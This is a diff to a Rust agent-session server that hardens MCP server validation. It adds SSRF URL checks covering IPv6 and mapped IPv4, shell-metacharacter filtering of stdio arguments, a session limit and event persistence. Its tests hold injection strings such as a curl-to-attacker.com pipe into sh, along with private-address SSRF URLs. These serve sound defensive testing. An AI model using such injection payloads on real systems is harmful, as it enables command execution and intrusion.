@@ -3,7 +3,10 @@ use crate::{
     error::AppError,
     events::spawn_ingestion_loop,
     manager::{ActiveSession, AppState, BROADCAST_CAPACITY},
-    types::{CreateSessionRequest, CreateSessionResponse, EventsQuery, McpServerConfig, PromptBody, SessionMeta, SessionStatus},
+    types::{
+        CreateSessionRequest, CreateSessionResponse, EventsQuery, McpServerConfig, PromptBody,
+        SessionMeta, SessionStatus, StoredEvent,
+    },
 };
 use agent_client_protocol::{McpServer, McpServerHttp, McpServerSse, McpServerStdio, SessionId};
 use axum::{
@@ -20,6 +23,18 @@ pub async fn create(
     State(state): State<AppState>,
     Json(body): Json<CreateSessionRequest>,
 ) -> Result<(StatusCode, Json<CreateSessionResponse>), AppError> {
+    // Bead .17 — session concurrency limit
+    let max_sessions = std::env::var("MAX_SESSIONS")
+        .ok()
+        .and_then(|v| v.parse::<usize>().ok())
+        .unwrap_or(usize::MAX);
+    if state.sessions.active_count() >= max_sessions {
+        return Err(AppError::InvalidRequest(format!(
+            "session limit reached (MAX_SESSIONS={})",
+            max_sessions
+        )));
+    }
+
     let agent_def = get_agent(&body.agent)
         .ok_or_else(|| AppError::AgentNotFound(body.agent.clone()))?;
     let handle = connect_agent(&agent_def).await.map_err(AppError::Acp)?;
@@ -110,12 +125,27 @@ pub async fn send_prompt(
         .agent_handle(&session_id)
         .ok_or_else(|| AppError::SessionDead(session_id.clone()))?;
     let session_id_for_task = session_id.clone();
+    // Bead .15 — clone state so the spawned task can push error events
+    let state_for_task = state.clone();
     tokio::spawn(async move {
         if let Err(error) = handle
             .prompt_text(SessionId::new(session_id.clone()), body.content)
             .await
         {
-            tracing::error!(session_id = %session_id_for_task, error = %error, "prompt failed");
+            tracing::error!(
+                session_id = %session_id_for_task,
+                error = %error,
+                "prompt failed"
+            );
+            // Push synthetic error event so SSE/polling clients can observe it
+            state_for_task
+                .sessions
+                .push_event(
+                    &session_id_for_task,
+                    "prompt_error".to_string(),
+                    serde_json::json!({ "error": error.to_string() }),
+                )
+                .await;
         }
     });
 
@@ -166,6 +196,10 @@ pub async fn resume(
         .get_async(&session_id)
         .await
         .ok_or_else(|| AppError::SessionNotFound(session_id.clone()))?;
+
+    // Bead .51 — re-validate cwd on resume (ALLOWED_CWD_BASE may have changed)
+    validate_cwd(&meta.cwd)?;
+
     let agent_def = get_agent(&meta.agent)
         .ok_or_else(|| AppError::AgentNotFound(meta.agent.clone()))?;
     let handle = connect_agent(&agent_def).await.map_err(AppError::Acp)?;
@@ -180,13 +214,33 @@ pub async fn resume(
         .await
         .map_err(AppError::Acp)?;
 
+    // Bead .57 — load prior events from disk
+    let events_path = state.sessions.session_events_path(&session_id);
+    let prior_events: std::collections::VecDeque<StoredEvent> =
+        if tokio::fs::try_exists(&events_path).await.unwrap_or(false) {
+            let contents = tokio::fs::read_to_string(&events_path)
+                .await
+                .unwrap_or_default();
+            contents
+                .lines()
+                .filter_map(|line| serde_json::from_str(line).ok())
+                .collect()
+        } else {
+            std::collections::VecDeque::new()
+        };
+
     let (tx, _rx) = broadcast::channel(BROADCAST_CAPACITY);
     let mut active_meta = meta.clone();
     active_meta.status = SessionStatus::Active;
-    state.sessions.insert(
-        session_id.clone(),
-        ActiveSession::new(active_meta, tx, Some(handle)),
-    );
+    let active_session = ActiveSession::new(active_meta, tx, Some(handle));
+
+    // Populate events from disk
+    if !prior_events.is_empty() {
+        let mut events_guard = active_session.events.write().await;
+        *events_guard = prior_events;
+    }
+
+    state.sessions.insert(session_id.clone(), active_session);
     spawn_ingestion_loop(Arc::clone(&state.sessions), session_id.clone());
     state
         .sessions
@@ -248,69 +302,99 @@ fn validate_cwd(cwd: &str) -> Result<std::path::PathBuf, AppError> {
     Ok(canonical)
 }
 
-fn validate_mcp_url(url: &str) -> Result<(), AppError> {
-    // Permit only http and https schemes.
-    if !url.starts_with("http://") && !url.starts_with("https://") {
-        return Err(AppError::InvalidRequest(format!(
-            "MCP server URL must use http or https scheme: {url}"
-        )));
-    }
+/// Bead .50 — robust SSRF validation using the `url` crate.
+fn validate_mcp_url(url_str: &str) -> Result<(), AppError> {
+    let url = url::Url::parse(url_str).map_err(|_| {
+        AppError::InvalidRequest(format!("MCP server URL is not valid: {url_str}"))
+    })?;
 
-    // Extract the host component (between "scheme://" and the first "/" or ":").
-    let after_scheme = url
-        .trim_start_matches("http://")
-        .trim_start_matches("https://");
-    let host = after_scheme
-        .split(&['/', ':'] as &[char])
-        .next()
-        .unwrap_or("");
-
-    // Block known sensitive hostnames before attempting IP parse.
-    let host_lower = host.to_lowercase();
-    if host_lower == "localhost" || host_lower.ends_with(".local") {
-        return Err(AppError::InvalidRequest(format!(
-            "MCP server URL targets a local/internal hostname: {url}"
-        )));
-    }
-
-    // If the host parses as an IP address, check against blocked ranges.
-    if let Ok(addr) = host.parse::<std::net::IpAddr>() {
-        if is_private_ip(&addr) {
+    match url.scheme() {
+        "http" | "https" => {}
+        _ => {
             return Err(AppError::InvalidRequest(format!(
-                "MCP server URL targets a private/internal address: {url}"
-            )));
+                "MCP server URL must use http or https scheme: {url_str}"
+            )))
+        }
+    }
+
+    let host = url.host().ok_or_else(|| {
+        AppError::InvalidRequest(format!("MCP server URL has no host: {url_str}"))
+    })?;
+
+    match &host {
+        url::Host::Domain(domain) => {
+            let lower = domain.to_lowercase();
+            if lower == "localhost" || lower.ends_with(".local") {
+                return Err(AppError::InvalidRequest(format!(
+                    "MCP server URL targets a local/internal hostname: {url_str}"
+                )));
+            }
+        }
+        url::Host::Ipv4(addr) => {
+            if is_private_ipv4(addr) {
+                return Err(AppError::InvalidRequest(format!(
+                    "MCP server URL targets a private/internal address: {url_str}"
+                )));
+            }
+        }
+        url::Host::Ipv6(addr) => {
+            if is_private_ipv6(addr) {
+                return Err(AppError::InvalidRequest(format!(
+                    "MCP server URL targets a private/internal address: {url_str}"
+                )));
+            }
         }
     }
 
     Ok(())
 }
 
-fn is_private_ip(addr: &std::net::IpAddr) -> bool {
-    match addr {
-        std::net::IpAddr::V4(v4) => {
-            let o = v4.octets();
-            // 127.0.0.0/8  — loopback
-            o[0] == 127
-            // 0.0.0.0/8
-            || o[0] == 0
-            // 10.0.0.0/8  — RFC-1918
-            || o[0] == 10
-            // 172.16.0.0/12  — RFC-1918
-            || (o[0] == 172 && o[1] >= 16 && o[1] <= 31)
-            // 192.168.0.0/16  — RFC-1918
-            || (o[0] == 192 && o[1] == 168)
-            // 169.254.0.0/16  — link-local / AWS & Azure IMDS
-            || (o[0] == 169 && o[1] == 254)
-        }
-        std::net::IpAddr::V6(v6) => {
-            // ::1  — loopback
-            v6.is_loopback()
-            // fe80::/10  — link-local
-            || v6.segments()[0] & 0xffc0 == 0xfe80
-            // fc00::/7  — unique local (ULA)
-            || v6.segments()[0] & 0xfe00 == 0xfc00
-        }
+fn is_private_ipv4(addr: &std::net::Ipv4Addr) -> bool {
+    let o = addr.octets();
+    // 127.0.0.0/8  — loopback
+    o[0] == 127
+    // 0.0.0.0/8
+    || o[0] == 0
+    // 10.0.0.0/8  — RFC-1918
+    || o[0] == 10
+    // 172.16.0.0/12  — RFC-1918
+    || (o[0] == 172 && o[1] >= 16 && o[1] <= 31)
+    // 192.168.0.0/16  — RFC-1918
+    || (o[0] == 192 && o[1] == 168)
+    // 169.254.0.0/16  — link-local / AWS & Azure IMDS
+    || (o[0] == 169 && o[1] == 254)
+}
+
+fn is_private_ipv6(addr: &std::net::Ipv6Addr) -> bool {
+    if addr.is_loopback() {
+        return true;
     }
+    let segs = addr.segments();
+    // fe80::/10  — link-local
+    if segs[0] & 0xffc0 == 0xfe80 {
+        return true;
+    }
+    // fc00::/7  — unique local (ULA)
+    if segs[0] & 0xfe00 == 0xfc00 {
+        return true;
+    }
+    // ::ffff:0:0/96  — IPv6-mapped IPv4; check the mapped v4 address
+    if segs[0] == 0
+        && segs[1] == 0
+        && segs[2] == 0
+        && segs[3] == 0
+        && segs[4] == 0
+        && segs[5] == 0xffff
+    {
+        let v4 = std::net::Ipv4Addr::new(
+            (segs[6] >> 8) as u8,
+            segs[6] as u8,
+            (segs[7] >> 8) as u8,
+            segs[7] as u8,
+        );
+        return is_private_ipv4(&v4);
+    }
+    false
 }
 
 fn validate_stdio_command(command: &str) -> Result<(), AppError> {
@@ -337,8 +421,6 @@ fn validate_stdio_command(command: &str) -> Result<(), AppError> {
     }
 
     // Reject known shell binaries and common escape tools by basename.
-    // Using a blocklist because a full allowlist would require enumerating all
-    // valid MCP server binary names, which is not feasible.
     let command_basename = std::path::Path::new(command)
         .file_name()
         .and_then(|n| n.to_str())
@@ -355,6 +437,32 @@ fn validate_stdio_command(command: &str) -> Result<(), AppError> {
         )));
     }
 
+    Ok(())
+}
+
+/// Bead .49 — validate individual stdio args against the same injection rules.
+fn validate_stdio_arg(arg: &str) -> Result<(), AppError> {
+    // Reject shell metacharacters.
+    let shell_metacharacters = [';', '|', '&', '`', '>', '<'];
+    for ch in shell_metacharacters {
+        if arg.contains(ch) {
+            return Err(AppError::InvalidRequest(format!(
+                "MCP stdio arg contains forbidden shell metacharacter: {ch}"
+            )));
+        }
+    }
+    // Reject shell substitution patterns.
+    if arg.contains("$(") || arg.contains("${") {
+        return Err(AppError::InvalidRequest(
+            "MCP stdio arg contains forbidden shell substitution".to_string(),
+        ));
+    }
+    // Reject newlines and null bytes.
+    if arg.contains('\n') || arg.contains('\r') || arg.contains('\0') {
+        return Err(AppError::InvalidRequest(
+            "MCP stdio arg contains forbidden control character (newline or null)".to_string(),
+        ));
+    }
     Ok(())
 }
 
@@ -375,9 +483,14 @@ fn mcp_to_acp(config: &McpServerConfig, index: usize) -> Result<McpServer, AppEr
             )))
         }
         McpServerConfig::Stdio { command, args } => {
+            // Bead .49 — validate each arg as well as the command
             validate_stdio_command(command)?;
+            for arg in args {
+                validate_stdio_arg(arg)?;
+            }
             Ok(McpServer::Stdio(
-                McpServerStdio::new(format!("mcp-stdio-{index}"), command.clone()).args(args.clone()),
+                McpServerStdio::new(format!("mcp-stdio-{index}"), command.clone())
+                    .args(args.clone()),
             ))
         }
     }
@@ -419,6 +532,31 @@ mod stdio_tests {
     fn test_validate_stdio_command_blocks_shell_substitution() {
         assert!(validate_stdio_command("${PATH}").is_err());
         assert!(validate_stdio_command("$(whoami)").is_err());
+    }
+
+    // Bead .49 — arg validation tests
+    #[test]
+    fn test_validate_stdio_arg_blocks_injection() {
+        // -S flag with embedded shell command (the original attack vector)
+        assert!(validate_stdio_arg("-S bash -c curl attacker.com|sh").is_err());
+        assert!(validate_stdio_arg("$(evil)").is_err());
+        assert!(validate_stdio_arg("${PATH}").is_err());
+        assert!(validate_stdio_arg("arg;evil").is_err());
+        assert!(validate_stdio_arg("arg|evil").is_err());
+        assert!(validate_stdio_arg("arg&evil").is_err());
+        assert!(validate_stdio_arg(">output").is_err());
+        assert!(validate_stdio_arg("<input").is_err());
+        assert!(validate_stdio_arg("arg\nevil").is_err());
+        assert!(validate_stdio_arg("arg\revil").is_err());
+        assert!(validate_stdio_arg("arg\0evil").is_err());
+    }
+
+    #[test]
+    fn test_validate_stdio_arg_permits_safe_args() {
+        assert!(validate_stdio_arg("--config").is_ok());
+        assert!(validate_stdio_arg("/path/to/config.json").is_ok());
+        assert!(validate_stdio_arg("some-value").is_ok());
+        assert!(validate_stdio_arg("").is_ok()); // empty arg is fine
     }
 }
 
@@ -476,5 +614,25 @@ mod tests {
         // 172.15.x.x and 172.32.x.x are public and must be allowed.
         assert!(validate_mcp_url("http://172.15.0.1/api").is_ok());
         assert!(validate_mcp_url("http://172.32.0.1/api").is_ok());
+    }
+
+    // Bead .50 — IPv6 bypass tests
+    #[test]
+    fn test_validate_mcp_url_blocks_ipv6_loopback() {
+        assert!(validate_mcp_url("http://[::1]:8080/").is_err());
+        assert!(validate_mcp_url("http://[::1]/api").is_err());
+    }
+
+    #[test]
+    fn test_validate_mcp_url_blocks_ipv6_mapped_ipv4() {
+        assert!(validate_mcp_url("http://[::ffff:127.0.0.1]/").is_err());
+        assert!(validate_mcp_url("http://[::ffff:192.168.1.1]/").is_err());
+        assert!(validate_mcp_url("http://[::ffff:10.0.0.1]/").is_err());
+    }
+
+    #[test]
+    fn test_validate_mcp_url_blocks_ipv6_link_local_and_ula() {
+        assert!(validate_mcp_url("http://[fe80::1]/").is_err());
+        assert!(validate_mcp_url("http://[fc00::1]/").is_err());
     }
 }
